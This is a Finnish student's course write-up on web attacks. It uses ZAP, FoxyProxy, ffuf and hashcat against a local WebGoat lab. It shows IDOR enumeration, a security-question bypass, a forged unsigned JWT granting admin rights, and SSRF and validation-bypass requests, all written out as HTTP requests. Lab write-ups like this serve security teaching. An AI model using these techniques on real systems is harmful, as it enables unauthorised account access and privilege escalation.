# Johdanto

VIikon tehtävänä on harjaantua WEBBIpalvelu hyökkäyksissä ja tutustua ZAP proxy palvelimen käyttöön. Viikon tehtävissä käytetään vain sallittuja maaleja.

Viikon tehtävät ovat kaikki Tero Karvisen Eettinen hakkerointi kurssilta.

Kurssisivu:
https://terokarvinen.com/2024/eettinen-hakkerointi-2024/#h5-taysin-laillinen-sertifikaatti

Viikon tehtävät ovat ajoittain erittäin haastavat ja aikaavieviä. Todennäköisesti en kerkiä tekemään kaikki tehtävät.

## x) OWASP 2021: OWASP Top 10:2021

**Broken Acces Control**
 - Rikkinäisen pääsynvalvonta webbipalveluissa on yleinen haavoittuvuus
 - Rikkinäisellä pääsynvalvonalla käyttäjät voivat tehdä asioita joita ei ole tarkoitettu mahdolliseksi
 - Tällä tavoin vihamielinen toimija voi saada tietoja joita on tarkoitus pitää salassa.
 - Käyttäjä voi saada oikeuksia joita ei hänelle kuulu
Lähde: https://owasp.org/Top10/A01_2021-Broken_Access_Control/

**Server side request forgery**

 - SSRF-haavoittuvuudet ilmenevät, kun verkkosovellus noutaa etäresurssia ilman käyttäjän antaman URL-osoitteen validoimista.
 - Ne mahdollistavat hyökkääjän pakottaa sovelluksen lähettämään harkitun pyynnön odottamattomaan kohteeseen, vaikka se olisi suojattu palomuurilla, VPN:llä tai muulla verkon pääsynhallintaluettelolla (ACL).
 - Nykyaikaisten verkkosovellusten tarjotessa käyttäjille käteviä ominaisuuksia URL-osoitteen noutaminen on yleistynyt.
 - SSRF:n esiintyvyys kasvaa, samoin sen vakavuus, etenkin pilvipalveluiden ja arkkitehtuurien monimutkaisuuden vuoksi.
Lähde: https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/

## x) PortSwigger Academy

**Insecure direct object references (IDOR)**

 - IDOR on pääsynvalvonnan haavoittuvuuden tyyppi, joka syntyy, kun sovellus käyttää käyttäjän antamaa syötettä päästäkseen objekteihin suoraan.
 -  Termi IDOR tuli tunnetuksi esiintymällä OWASPin 2007 Top Ten -listalla.
 - Se on yksi monista pääsynvalvonnan toteutusvirheistä, jotka voivat johtaa pääsynvalvonnan kiertämiseen.
 - IDOR-haavoittuvuudet liittyvät yleisimmin vaakasuuntaiseen käyttöoikeuden laajentamiseen, mutta ne voivat esiintyä myös pystysuuntaisen käyttöoikeuden laajentamisen yhteydessä.
Lähde: https://portswigger.net/web-security/access-control/idor

**Path Traversal**

 - Path Traversal tunnetaan myös hakemistototeutuksena.
 - Haavoittuvuudet mahdollistavat hyökkääjän lukea a tiedostoja palvelimelta joita ei ole tarkoitettu luettavaksi.
 - Tämä voi sisältää sovelluksen lähdekoodin , taustajärjestelmien tunnistetiedot ja herkät käyttöjärjestelmätiedostot kuten salasanoja.
 - Joissakin tapauksissa hyökkääjä voi kirjoittaa  tiedostoihin palvelimella, mahdollistaen sovellusdatan tai käyttäytymisen muokkaamisen ja lopulta täyden hallinnan saavuttamisen palvelimeen.
Lähde: https://portswigger.net/web-security/file-path-traversal

**Server-side template injection**
   - Server-side Template injektio tapahtuu, kun hyökkääjä pystyy käyttämään alkuperäistä mallin syntaksia injektoimaan haitallisen kuorman malliin, joka suoritetaan sitten palvelimen puolella.
   - Haavoittuvuudet voivat altistaa verkkosivustoja monenlaisille hyökkäyksille riippuen sovelluksen käyttämästä tavasta käsitellä tietoja.
   - Vakavimmassa tapauksessa hyökkääjä voi saavuttaa koodin suorituksen etänä, saaden täyden hallinnan palvelimesta ja käyttää sitä suorittaakseen muita hyökkäyksiä sisäiseen infrastruktuuriin.
   - Vaikka täydellinen koodin ajaminen etänä ei olisi mahdollista, hyökkääjä voi silti käyttää injektiota perustana lukuisille muille hyökkäyksille, saaden lukuoikeuden herkkiin tietoihin ja tiedostoihin palvelimella.
Lähde: https://portswigger.net/web-security/server-side-template-injection
**Server-side request forgery** 

 - Palvelinpuolen pyynnön väärentäminen (SSRF) on verkkoturvallisuuden haavoittuvuus, joka mahdollistaa hyökkääjän tekemään pyyntöjä tarkoittamattomaan sijaintiin.
 - Tyypillisessä SSRF-hyökkäyksessä hyökkääjä voi saada palvelimen muodostamaan yhteyden organisaation infrastruktuurin sisäisiin palveluihin tai ulkoisiin järjestelmiin.
 - Tämä voi johtaa salaisten tietojen vuotamiseen, kuten tunnistetietoihin, aiheuttaen turvallisuusriskejä.
Lähde: https://portswigger.net/web-security/ssrf

**Cross-site scripting**

- Cross-site scripting on hyökkäysmenetelmä joka mahdollistaa hyökkääjän vaarantamaan käyttäjän vuorovaikutuksen palvelun tai ohjelmiston kanssa.
- Hyökkääjä pystyy tällä tavoin kiertämään säännöksiä jotka estävät käyttäjän siirtyvän eri webbisivuille.
- Jos uhrilla on riittävän korkeat pääsyoikeudet hyökkääjää pystyy ottamaan hallinan Webpalvelusta.
  
## a) Asenna ZAP, generoi CA sertifikaatti ja asenna se selaimeen

Ensimmäisen tehtävän suoritin jo tunnin aikana mutta tunnin aikana en tehnyt muistiinpanoa tai laatinut raporttia.

ZAP proxy palvelimen asentaminen voidaan toteuttaa suoraan Kalin virallisesta reposta:

    ┌──(kynaniska㉿kynaniska)-[~]
    └─$ sudo apt-get install zaproxy
![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/23639faa-9616-49e2-8e61-75e3f62a7847)

Käynistin ZAP proxyn joka kestää noin minuuttin. ZAP toimii minulla portissa 8081. Vaihdoin oletus portin 8080 toiseen koska käytin foxyproxya aikasemmin.
Kuvankaappauksesta näkyy että ZAP alkaa seurata kaikkea liikenettä mitä firefox selaimessa tapahtuu. Kuvassa menin sivulle `google.com`. 

Käytän google.com esimerkkinä koska en tee aktiivisia toimia sitä vastaan. Jos haluaisin tehdä aktiivisia toimia minun pitäisi käyttää hyväksyttyä kohdetta kuten `webgoat`.

ZAP luo automaattisesti "Väärenetyn" sertifikaatin. Sen saa esille ZAP valikosta `tools/preferences/network/Server sertificates`.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/f24659f6-5bcf-473b-8b11-74a965495ac6)

Sertifikaatin voi asentaa selaimelle valikosta `setting/Security/Certificates` 

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/d4545055-f08d-4d2a-b4f5-51a51de883d6)

Kuvankaappauksesta näkyy generoimani sertifikaatti. `ZAP Attack Proxy ROOT CA`.

Jotta saan ZAP analyysissä kuvat näkyviin ne pitää laittaa päälle asetuksista. Ne eivät ole vakiona päällä.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/4c893e81-423d-4a84-a40a-3197f8019029)

Nyt on ZAP valmiina hyökkäyksiä varten!!

## b)Foxyproxy ja sen käyttö

FoxyProxy on mozilla firefoxiin asennettava lisäosa. Lisäosa toimii proxyna ja mahdollistaa localhost liikenteen reitittyvän ZAP palvelimelle.

Foxyproxy on saatavilla sivulla: https://getfoxyproxy.org/

Foxyproxy on käytännössä tässä tapauksessa proxyn proxy. Eli kun koneeni ottaa yhteyttä esim. google.com sen hakupyynnöt ohjautuvat ensiksi foxyproxyyn ja sen jälkeen ZAP proxyyn.

Asetukseni näyttävät seuraavalta:

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/83a28371-4ae5-4d82-95d4-878a0de5c88c)



Jotta ZAP ei vahingossakaan sieppaisi liikennettä tai hyökkäisi kohteisiin jota en haluaisi niin käytän Pattern asetuksia. Pattern mahdollistaa sen että FoxyProxy ohjaa vain tietyn sivuston liikenteen ZAP palvelimelle. Tämän viikon harjoituksissa tulemme käyttämään `localhost` sekä `portswigger.com` sivustoja.

Foxyproxy lisäosasta pitää vielä valita `Proxy by pattern`

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/d7e60124-f8d4-47f4-95c8-15ff44434013)

Kokeilen tätä menemällä `portswigger.com` sivustolle selaimella jonka jälkeen menen ZAP valikkoon tarkastamaan tulosta.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/daca3ee4-3bf2-491a-805a-9c7c9b0294df)

Kun menen google.com niin ZAP ohjelmaan ei ilmesty mitää liikenettä.


## k) Webgoat 2023.4

Aikaisemmissa tehtävissä olin jo asentanut Webgoatin. 

Asennustiedostot löytyvät: https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar

Asennus tapahtuu komennoilla.

        wget https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar
        java -jar webgoat-2023.4 jar.
## i) Pencode

Tehtävänä on asentaa Pencode. Pencode on ´saatavilla Githubista: https://github.com/ffuf/pencode/tree/master.
Pencoden kehittäjä on Joohoi joka on myös kehittänyt FFuF jota aikasemmin käytimme kurssilla.

Pencode on myös saatavilla Kalin virallisessa repossa:

        sudo apt install golang-github-ffuf-pencode-dev
        Do you want to install it? (N/y)N

Pencode avulla on mahdollista koodata tekstiä haluttuun muotoon kuten UTF8, UTF16 jne. Sillä voi myös koodata tekstiä tiivisteiksi kuten SHA256 ja MD5.

        ┌──(kynaniska㉿kynaniska)-[~/pencode]
        └─$ echo 'hello world' | pencode md5   ## Koodaa hello world MD5 tiivisteeksi     
        5eb63bbbe01eeed093cb22bb8f5acdc3 ##MD5 tiiviste

Kokeilen vielä hashcatilla avata tiivisteen.

        ┌──(kynaniska㉿kynaniska)-[~/pencode]
        └─$ hashcat -m 0 testi /usr/share/wordlists/rockyou.txt
        5eb63bbbe01eeed093cb22bb8f5acdc3:hello world  

Voin todeta että `Pencode` toimii!

# Portswigger labs

Valitettavasti minulta loppui aika kesken enkä kerennyt tekemään näitä tehtäviä. Suoritin kuitenkin Webgoat tehtävät koska ne pystyi ratkaisemaan paikallisesti ja ilman internet yhteyttä.


# WebGoat Tehtävät

## (A1) Broken Access Control

**Hijack a session** (1). Tehtävänä on siepata sessioni. Olen täysin hukassa alussa. Kuitenkin Webgoat vinkissä on että tarkasta keksi `hijack_cookie` on mielenkiintoinen keksi ja sen formaatti pitäisi kiinnostaa meitä.

Keksi näyttää seuraavalta:

        hijack_cookie=4206604424165878483-1714749083288

Webgoat vinkeistä saan neuvon että kokeile lähettää "väärenetyn keksin`. Kokeilen sitä ZAP:lla. Mutta tämä ei tuota tulosta.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/03b24c76-c485-4f01-8bf9-49a387b409c3)

Muutan keksin arvon:

        hijack_cookie=1-1714749083288

Mutta tämä ei tee mitään.

Löysin hyödyllisen blogipostauksen: https://olleb.com/OWASP-WebGoat-hijack-session/. Mutta valitettavasti se ei hyödytä minua tässä ongelmassa.

Ymmärrän että minun on tarkoitus siepata keksi joka koostuu kahdesta osasta: Juokseva numero ja "unix epoch time". Jälkimmäinen osa on sekuntit jotka on kulunut 1.1.1970 asti. Mutta outoa että minun ympäristössä tämä arvo ei muutu.

Tulen siihen lopputulokseen että en saa tätä tehtävää suoritettua.

**Insecure Direct Object References**

Sieppaan pyynnön Tom Cat profiilista kohdassa 4.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/11c675d1-1bbe-49e6-bf23-838a2159f6e5)

Ylläoleva pyntö kohdistuu URL: webgoat/IDOR/profile. Mutta en vaan millään ymmärrä miten saan selville "oman" profiilin tiedot.


Kokeilen myös lisäämällä `Tom Cat` käyttäjän käyttäjäid URL perään:

        webgoat/IDOR/profile/2342384

Ja tässä vaiheessa tajusin että URL pitää kirjoittaa oikeilla isoilla kirjaimilla. Eli vastaus oli:

        WebGoat/IDOR/profile/2342384

**Toisen käyttäjän tietojen muokkaaminen**

Tehtävänä on löytää ja muokata toisen käyttäjän tietoja. Tätä tehtävää en olisi voinut ratkaista ilman apuja.

Löysin hyvän ohjeen: https://pvxs.medium.com/webgoat-idor-5-f3b0beba931 jossa selitetään mitä pitäisi tehdä.

Eli käyttäjää voisi FUZZATA. Ja tämänhän minä osaan!!

Luon ensin tiedoston missä on lista numeroista 000-999.

        seq -f "%03g" 000 999 > numbers.txt

Jonka jälkeen käytän fuffia kohdetta vastaan:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ ffuf -c -w numbers.txt \
    -u http://localhost:8080/WebGoat/IDOR/profile/2342FUZZ \ ##Fuzzauksen kohde
    -H "Host: localhost:8080" \ ##Host. En ole ihan varma onko tämä pakollinen
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate" \
    -H "Cookie: JSESSIONID=f9yNiTRQ62ypFLClEtjFufjYU8ZYQTBDw6bmECyj; hijack_cookie=4206604424165878483-1714749083288" \ ##Sessionin keksi
    -mc 200 -t 1

Vastauksena saan kaksi käyttäjää:
    
    384                     [Status: 200, Size: 250, Words: 40, Lines: 7, Duration: 37ms]
    388                     [Status: 200, Size: 245, Words: 32, Lines: 7, Duration: 4ms]
    :: Progress: [1000/1000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

TOinen USERID 2342384 on aiemmin käytetty Tom Cat. Toinen on pakko olla meidän kohde.

Kokeilen tehdä GET pyynnön tälle tilille:

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/f21d29ee-dacd-4a24-9066-e6d74c339099)

Noniin sit sen arvoja pitäisi muuttaa.

Tässä vaiheessa joudun taas seuraamaan ohjeita.

Mutta lopputulos näyttää tältä.

  
    PUT http://localhost:8080/WebGoat/IDOR/profile/2342388 HTTP/1.1 ## Pakko käyttää PUT metodia koska POST ei ole sallittu
    host: localhost:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/json; charset=UTF-8 ## Koska haluan syöttää JSON tiedoston tämäkin piti muuttaa.
    X-Requested-With: XMLHttpRequest
    Connection: keep-alive
    Referer: http://localhost:8080/WebGoat/start.mvc
    Cookie: JSESSIONID=f9yNiTRQ62ypFLClEtjFufjYU8ZYQTBDw6bmECyj; hijack_cookie=4206604424165878483-1714749083288
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    content-length: 106
    
    
    {
      "role" : 1,
      "color" : "red",
      "size" : "large",
      "name" : "Buffalo Bill",
      "userId" : "2342388"
        }    

Tätä tehtävää tehdessä nojauduin vahvasti ohjeisiin. Muutoin en olisi selvinnyt millään tästä.



## n) Identity & Auth failure

**Authentication bypass**

Tehtävänä on ohittaa kaksvaihe tunnistautumisen ja uusia käyttäjän salasana. Tehtävässä on jo käyytetty sähköpostia joten sitä ei tarvitse murehtia.

Kokeilen ensiksi laittaa `test` turvallisuuskysymysten kysymyksiin ja tutkin sitten HTTP liikennettä. POST pyyntö näyttää seuraavalta:

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/cf73aff3-8b5f-40ec-9447-ac3d44be15a6)

Muokkaan Post pyynnön sisältöä:

        secQuestion0=Test&secQuestion1=test&jsEnabled=1&verifyMethod=NULL&userId=12309746

Tämä ei kuitenkaan tee mitään. Vinkeistä saan selville että varmistus logiikassa on vikaa ja että kysymyksien parametreja on muutettava.

Kokeilen siis muuttaa turvallisuuskysymykset eri numeroille ja laittaa hölynpölyä niiden vastaukseksi.

        secQuestion2=ASD&secQuestion3=ASD&jsEnabled=0&verifyMethod=SEC_QUESTIONS&userId=12309746

Ja vastauksena saan:

        {
      "lessonCompleted" : true,
      "feedback" : "Congrats, you have successfully verified the account without actually verifying it. You can now change your password!",
      "output" : null,
      "assignment" : "VerifyAccount",
      "attemptWasMade" : true
    }

Mahtavaa homma tehty

**Insecure Tokens**

Tehtävänä on tarkastaa lähettääkö tyhjän arvojen lähettämisen kirjautumissivuun tietoja POST pyyntöön. Ja näinhän se tekee.
Painan Login nappulaa ja tarkastan POST pyynnön sisällön. Ja se sisältää käyttäjän kirjautumistiedot.

        POST http://localhost:8080/WebGoat/start.mvc HTTP/1.1
        host: localhost:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Content-Type: text/plain;charset=UTF-8
        Content-Length: 50
        Origin: http://localhost:8080
        Connection: keep-alive
        Referer: http://localhost:8080/WebGoat/start.mvc
        Cookie: JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        {"username":"CaptainJack","password":"BlackPearl"}

Tehtävän tavoitteena oli siis tutustua sniffereiden toimintaan.

**JWT tokens**

Ensimmäisenä tehtävänä on dekoodata JWT tokeni. JWT tokenit on koodattu Base64 koodauksella. Käytän Pencode ohjelmaa sen dekoodamiseen. Webgoat oppaissa lukee että JWT tokeni on jaettu kolmeen osaan ja erittäjänä toimii `.`.

Eka osa on Header osa:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo 'eyJhbGciOiJIUzI1NiJ9'|pencode b64decode
        {"alg":"HS256"}     
        
Toka osa on "claims":

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo 'ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9' |pencode b64decode
        {
          "authorities" : [ "ROLE_ADMIN", "ROLE_USER" ],
          "client_id" : "my-client-with-secret",
          "exp" : 1607099608,
          "jti" : "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
          "scope" : [ "read", "write" ],
          "user_name" : "user"
        }           
Sieltähän löytyy kivaa tietoja. Vastaus on `user`.

Tehtävässä 5 on tarkoitus on vaihtaa tokeni ADMIN käyttäjäksi.

Ensiksi puran `jerry` käyttäjän tokenin ja katson että se on allekirjoitettu:

        eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MTU2OTc5NDgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.TSnOjrxkmXgyWSmHCRV37-vI27vmd5sC9isbwmrapivUCSo1E6HBWj2yuvAL8eRf7vIYLz62ZBhoVpAnt0B9Jw

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo 'eyJhbGciOiJIUzUxMiJ9' |pencode b64decode
        {"alg":"HS512"} 

Toiseen osaan saan kuitenkin virheen:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo 'eyJpYXQiOjE3MTU2OTc5NDgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ'|pencode b64decode
          [!] illegal base64 data at input byte 64

  Tätä jäin ihmettelemään ja löysin hyödyllisen sivun missä selitetään JWT tokenit tarkemmin: 
https://pvxs.medium.com/webgoat-jwt-tokens-4-5-ff5bd88e76f

Sivustolla löytyy vastaus tehtävään mutta pyrin olemaan käyttämättä sitä. Ongelma kun yritön dekoodata JWT tokenin on että minun pitää lisätä = tokenin toisen osan loppuun. Silloin se palauttaa JSON tiedoston oikeassa muodossa.

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo 'eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0=' |pencode b64decode                      
        {"iat":1715698859,"admin":"false","user":"Tom"}

Sitten vielä dekodaan viimeisen osan:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo '4rGJaawJ54gLSvEHoWWnVwWfcgHSjYsC2-YtRmVFSBhwReaAXFTFKCEoz-WIQ1H9Aln4jnIMV8iel503wuJjIQ='|pencode b64decode
          [!] illegal base64 data at input byte 33

Eli minun on nyt tarkoitus lähettää POST pyyntö missä on Algorithmi = null ja käyttäjän tiedot muutettu. Teen JSON tiedoston ja muunnan sen koodaan sen base64 muotoon:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo '{"alg":"none"}' |pencode b64encode
        eyJhbGciOiJub25lIn0=                                                                                                                                                        
                                                                                                                                           
        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ echo '{"iat":1715698859,"admin":"true","user":"Tom"}' |pencode b64encode
        eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==   


Lopputulokseni tokenista:

        eyJhbGciOiJub25lIn0=.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==

Katotaan toimiiko jos lisään tämän POST pyyntöön.

        POST http://localhost:8080/WebGoat/JWT/votings/Admin%20lost%20password HTTP/1.1
        host: localhost:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        X-Requested-With: XMLHttpRequest
        Origin: http://localhost:8080
        Connection: keep-alive
        Referer: http://localhost:8080/WebGoat/start.mvc
        Cookie: access_token=eyJhbGciOiJub25lIn0=.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Content-Length: 0
Ei toimi!. Tein pieniä muutoksia tokeniin, Poistin kaikki `=` merkit ja lisäsin pisteen viimeiseksi. 

        POST http://localhost:8080/WebGoat/JWT/votings/Admin%20lost%20password HTTP/1.1
        host: localhost:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        X-Requested-With: XMLHttpRequest
        Origin: http://localhost:8080
        Connection: keep-alive
        Referer: http://localhost:8080/WebGoat/start.mvc
        Cookie: access_token=eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Content-Length: 0

Vastauksena sain 202 ACCEPTED:

        
        HTTP/1.1 202 Accepted
        Connection: keep-alive
        X-XSS-Protection: 1; mode=block
        X-Content-Type-Options: nosniff
        X-Frame-Options: DENY
        Content-Length: 0
        Date: Sat, 04 May 2024 15:27:24 GMT

Tässä tehtävässä käytän myös sivustoa: https://jwt.io/ Base64 dekoodamiseen ja koodamiseen.

En päässy läpi tehtävää koska tarkoitus oli nollata salasanat ADMIN käyttäjänä. Eli lähetin väärää POST pyyntöä. Klickaan reset vote josta saan POST pyynnön. Siihen muutan Acces tokenin juuri luomaani tokeniin joka ei ole allekirjoitettu:

        POST http://localhost:8080/WebGoat/JWT/votings HTTP/1.1
        host: localhost:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Origin: http://localhost:8080
        Connection: keep-alive
        Referer: http://localhost:8080/WebGoat/start.mvc
        Cookie: access_token=eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Content-Length: 0
Ja siihen saan vastauksen:

        {
          "lessonCompleted" : true,
          "feedback" : "Congratulations. You have successfully completed the assignment.",
          "output" : null,
          "assignment" : "JWTVotesEndpoint",
          "attemptWasMade" : true
        }
Melkosta...

**JWT Cracking**

Tehtävänä on murtaa allekirjoitus tokenista ja muuttaa käyttäjänimi `Webgoat`:ksi.

Aloitan dekodaamalla Tokeni. Tähän käytän jwt.io sivustoa koska se on helppo ja pencode on aikaa vievämpi.

     
        {
          "alg": "HS256"
        }
        
        {
          "iss": "WebGoat Token Builder",
          "aud": "webgoat.org",
          "iat": 1714833339,
          "exp": 1714833399,
          "sub": "tom@webgoat.org",
          "username": "Tom",
          "Email": "tom@webgoat.org",
          "Role": [
            "Manager",
            "Project Administrator"
          ]
        }
        
        HMACSHA256(
          base64UrlEncode(header) + "." +
          base64UrlEncode(payload),
          
        your-256-bit-secret
        
        ) secret base64 encoded

Tämän jälkeen lähden murtamaan HMACSHA256 salattua tiivistettä.

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ hashid -m 'bGw6Yo8M1vwkn2SvN9kVLMz8C3J6w8BURAtP2F9f3KU'
        Analyzing 'bGw6Yo8M1vwkn2SvN9kVLMz8C3J6w8BURAtP2F9f3KU'
        [+] Cisco-IOS(SHA-256) [Hashcat Mode: 5700]
        [+] Cisco Type 4 
ELi Haschat mode 5700

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
        └─$ hashcat -m 5700 '8hx19xAFPfim6VJv17kb85HagyyUJGQHvv0TqHl5LvI' /usr/share/wordlists/ -o solved 

En saa kuitenkaan mitään osumia.

TÄtä ongelmaa hakkasin pitkään ja päätin lopettaa WEBGOAT harjoitteen tähän. Lopettamisen jälkeen tajustin että tämä tehtävä ei ollut edes viikko tehtävissä :D

## 0) Server side request forgery

Tehtävänä on muokata pyyntöä joka client lähettää palvelimelle jotta se antaisi hyökkääjälle mitä haluaisi.

Tehtävässä on valikko mistä voi lähettää POST pyynnön palvelimelle.

        POST http://localhost:8080/WebGoat/SSRF/task1 HTTP/1.1
        host: localhost:8080
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        content-length: 22
        Origin: http://localhost:8080
        Connection: keep-alive
        Referer: http://localhost:8080/WebGoat/start.mvc
        Cookie: JSESSIONID=UXiOhe-n5s-iakN8h5sSxxtjJ26GsscG2Q_gDuX_
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        url=images%2Ftom.png

Otin kyseisen pyynnön ja muutin arvot:

        url=images%2Fjerry.png

Huh onneksi oli helppo tehtävä.

Seuraava tehtävä on samanlainen.

        url=images%2Fcat.png
Tässä alkuperäinen ja muokattu POST pyynnön sisältö:

        url=http://ifconfig.pro
Onneks oli helppo tehtävä taas.

## p) Client side/Bypass front-end restrictions.

Tehtävänä on ratkoa Front-end ratkasujen heikkouksia ja hyödyntää niitä hakkeroinissa.

**Field Restrictions**

Tehtävänä on löytää haavoittuvuuksia HTML koodissa. Avaan selaimesta sivuston HTML koodin ja tutkin niitä tarkemmin.

        <div class="input-group">
                        <select name="select">
                            <option value="option1">Option 1</option>
                            <option value="option2">Option 2</option>
                        </select>
                    </div>
Ensimmäisen valikon HTML koodi ei anna minulle hirveästi eväitä. Jatkan tutkimista.

Päätän kuitenkin kokeilla laittaa "ei sallitut" vastaukset POST pyyntöön:

        select=option2&radio=option2&checkbox=on&shortInput=12345&readOnlyInput=change ##Alkuperäinen

        select=optionA&radio=optionB&checkbox=X&shortInput=123456&readOnlyInput= ## Muutettu, Tässä olen vaihtanut arvot ei sallittuihin.

Ja vastauksena sain onnistuneen tehtävän!

**Validation**

Tehtävänä on kiertää validointi säännöt. ALoitan lähetämällä oikean pyynnön jonka jälkeen lähden muokkaamaan sitä.

        field1=abc&field2=123&field3=abc+123+ABC&field4=seven&field5=01101&field6=90210-1111&field7=301-604-4882&error=0
        
        field1=abc!&field2=123A&field3=abc+123+ABC__&field4=sasd&field5=01101asd&field6=90210-1111aa&field7=301-604-4882asd&error=0 ##Muutettu.

Tehtävä siis ratkaistiin samalla tavalla kuin äskeinen tehtävä. Tässä tehtävässä kuitenkin ohitettiin regex sääntöjä.









